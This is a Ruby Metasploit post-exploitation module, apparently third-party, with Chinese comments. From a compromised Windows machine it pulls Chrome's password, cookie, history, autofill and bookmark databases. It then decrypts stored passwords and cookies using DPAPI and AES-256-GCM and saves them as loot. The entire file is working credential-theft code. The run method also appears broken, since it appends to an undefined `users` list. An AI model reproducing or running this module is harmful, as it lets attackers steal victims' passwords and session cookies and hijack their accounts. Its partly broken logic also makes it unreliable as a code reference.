# -*- coding: UTF-8 -*-

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::Priv

  def initialize(info={})
    super(
      update_info(
        info,
        'Name' => 'Google Chrome 密码获取',
        'Description' => %q{
          从Chrome本地数据库中获取密码/Cookies/历史记录/书签，
          如果session的进程是system用户的进程需要迁移到管理员的进程，
          （未完待续的功能：判断session的进程是否为system用户的进程）
        },
        'References' => [
          [ 'URL', 'https://github.com/moonD4rk/HackBrowserData' ],
          [ 'URL', 'https://source.chromium.org/chromium/chromium/src/+/master:components/os_crypt/os_crypt_win.cc']
        ],
        'Author' => [ '3ricK5r' ],
        'License' => MSF_LICENSE,
        'Platform' => [ 'win' ],
        'SessionTypes' => [ 'meterpreter' ]
      )
    )
  end

  def decrypt_data_with_DPAPI(data)
    rg = session.railgun
    pid = session.sys.process.open.pid
    process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)
  
    mem = process.memory.allocate(1024)
    process.memory.write(mem, data)
  
    if session.sys.process.each_process.find { |i| i["pid"] == pid} ["arch"] == "x86"
  
      addr = [mem].pack("V")
      len = [data.length].pack("V")
      ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 8)
      len, addr = ret["pDataOut"].unpack("V2")
  
    else
  
      addr = [mem].pack("Q")
      len = [data.length].pack("Q")
      ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 16)
      len, addr = ret["pDataOut"].unpack("Q2")
  
    end
  
    return "" if len == 0
    decrypted = process.memory.read(addr, len)
    return decrypted
  end

  def decrypt_data_with_aes_256_gcm(data, key)
  
    iv = data[3, 12]
    encrypted_data = data[15, data.length-15]
    aes = OpenSSL::Cipher.new('AES-256-GCM')
    aes.decrypt
    aes.key = key
    aes.iv = iv
    
    decrypted = aes.update(encrypted_data)
  
    if decrypted.length > 16
      return decrypted[0, decrypted.length-16]
    else 
      return decrypted
    end
  end

  def decrypt_data(data, key)
    if key.nil?
      return decrypt_data_with_DPAPI(data)
    else
      return decrypt_data_with_aes_256_gcm(data, key)
    end
  end

  def get_secret_key(chrome_key_file_path)
    json_content = ''

    present = File::exists?(chrome_key_file_path) rescue nil
    if present
      file_key = File.open(chrome_key_file_path, "rb")
      until file_key.eof?
        json_content << file_key.gets
      end
      file_key.close
    end

    encrypted_key = JSON.parse(json_content)['os_crypt']['encrypted_key']

    secret_key = nil
    unless encrypted_key.nil?
      pureKey = Base64.decode64(encrypted_key)
      secret_key = decrypt_data_with_DPAPI(pureKey[5, pureKey.length-5])
    end

    secret_key
  end

  def download_file(username)
    chrome_path = @profiles_path + "\\" + username + @data_path
    raw_files = {}

    # @chrome_files.map{ |e| e[:in_file] }.uniq.each do |f|
      @chrome_files.map{ |e| [e[:in_file], e[:ext]] }.uniq.each do |f, m|
      remote_path = chrome_path + '\\' + f

      #Verify the path before downloading the file
      if file_exist?(remote_path) == false
        print_error("#{f} not found")
        next
      end

      # Store raw data
      local_path = store_loot("#{f}", "", session, "chrome_raw_#{f}", "#{f}.#{m}")
      raw_files[f] = local_path
      session.fs.file.download_file(local_path, remote_path)
      print_good("原始数据 #{f}: #{local_path}")
    end

    #Assign raw file paths to @chrome_files
    raw_files.each_pair do |raw_key, raw_path|
      @chrome_files.each do |item|
        if item[:in_file] == raw_key
          item[:raw_file] = raw_path
        end
      end
    end

    true
  end

  def analyse_file(secret_key)

    @chrome_files.each do |item|
      secrets = ""
      decrypt_table = Rex::Text::Table.new(
        "Header"  => "Decrypted data",
        "Indent"  => 1,
        "Columns" => ["Name", "Decrypted Data", "Origin"]
      )
  
      next if item[:sql] == nil
      next if item[:raw_file] == nil

      db = SQLite3::Database.new(item[:raw_file])
      begin
        columns, *rows = db.execute2(item[:sql])
      rescue
        next
      end
      db.close

      rows.map! do |row|
        res = Hash[*columns.zip(row).flatten]
        if item[:encrypted_fields] #&& !session.sys.config.is_system?

          item[:encrypted_fields].each do |field|
            name = (res["name"] == nil) ? res["username_value"] : res["name"]
            origin = (res["host_key"] == nil) ? res["origin_url"] : res["host_key"]
            
            pass = decrypt_data(res[field], secret_key)

            if pass != nil and pass != ""
              decrypt_table << [name, pass, origin]
              secret = "#{name}:#{pass}..... #{origin}"
              secrets << secret << "\n"
              # vprint_good("解密数据: #{secret}")
            end
          end
        end
      end


      if secrets != ""
        path = store_loot("chrome.decrypted", "text/plain", session, decrypt_table.to_s, "decrypted_chrome_data.txt", "Decrypted Chrome Data")
        print_good("解密后的数据#{item[:in_file]}: #{path}")
      end
    end

  end
  
  def sqlite3?
    has_sqlite3 = true
    begin
      require 'sqlite3'
    rescue LoadError
      print_warning("错误：未安装SQLite3，请确认！")
      has_sqlite3 = false
    end
    has_sqlite3
  end

  def get_users(is_in_admin_group, cur_username)
    usernames = []
    if is_in_admin_group
      session.fs.dir.foreach(@profiles_path) do |u|
        not_actually_users = [
          ".", "..", "All Users", "Default", "Default User", "Public", "desktop.ini",
          "LocalService", "NetworkService"
        ]
        usernames << u unless not_actually_users.include?(u)
      end
    else
      uid = session.sys.config.getuid
      usernames << cur_username.strip if cur_username
    end

    usernames
  end

  def run()
    return unless sqlite3?

    @chrome_files = [
      { :raw => "", :in_file => "Default\\Web Data", :ext => "sq3", :sql => "select * from autofill;"},
      { :raw => "", :in_file => "Default\\Web Data", :ext => "sq3", :sql => "SELECT username_value,origin_url,signon_realm FROM logins;"},
      { :raw => "", :in_file => "Default\\Web Data", :ext => "sq3", :sql => "select * from autofill_profiles;"},
      { :raw => "", :in_file => "Default\\Cookies", :ext => "sq3", :sql => "select * from cookies;", :encrypted_fields => ["encrypted_value"]},
      { :raw => "", :in_file => "Default\\History", :ext => "sq3", :sql => "select * from urls;"},
      { :raw => "", :in_file => "Default\\History", :ext => "sq3", :sql => "SELECT url FROM downloads;"},
      { :raw => "", :in_file => "Default\\History", :ext => "sq3", :sql => "SELECT term FROM keyword_search_terms;"},
      { :raw => "", :in_file => "Default\\Login Data", :ext => "sq3", :sql => "select * from logins;", :encrypted_fields => ["password_value"]},
      { :raw => "", :in_file => "Default\\Bookmarks", :ext => "txt", :sql => nil},
      { :raw => "", :in_file => "Local State", :ext => "txt", :sql => nil},
    ]

    env_vars = session.sys.config.getenvs('SYSTEMDRIVE', 'USERNAME')
    sysdrive = env_vars['SYSTEMDRIVE'].strip
    if directory?("#{sysdrive}\\Users")
      @profiles_path = "#{sysdrive}\\Users"
      @data_path = "\\AppData\\Local\\Google\\Chrome\\User Data"
    elsif directory?("#{sysdrive}\\Documents and Settings")
      @profiles_path = "#{sysdrive}/Documents and Settings"
      @data_path = "\\Local Settings\\Application Data\\Google\\Chrome\\User Data"
    end

    if is_system?
      print_status("session的进程是system用户的进程，请先迁移到需要获取chrome信息的用户的进程再执行本模块！")
      return
    end
    
    # 需要测试是否在管理员环境下可以获取所有用户的信息，而不是system用户下面(已经完成测试，管理员环境下，不能获取其他管理员的chrome信息)
    # 考虑目前的测试方案：先迁移到system环境下面，获取所有用户的chrome数据，然后再回到管理员（用户）环境下，进行解密操作
    # 经过测试在system用户环境下，不能调用解密API
    # 经测试从system用户迁移到管理员（用户）环境下，原来的进程就不存在了，无法迁移回去。而且在console下面测试session命令migrate也没法迁移到system用户
    # ......
    # users = get_users(is_system?, env_vars['USERNAME'])

    users << env_vars['USERNAME'].strip if env_vars['USERNAME']

    users.each do |user|
      @chrome_files.each do |item|
        item[:raw_file] = ""
      end

      print_status("【#{user}的chrome数据】")
      download_file(user)

      key = nil
      @chrome_files.each do |item|
        if item[:in_file] == "Local State" and item[:raw_file] != ""
          key = get_secret_key(item[:raw_file])
        end
      end
  
      analyse_file(key)
      print_status("—"*40)
    end
  end
end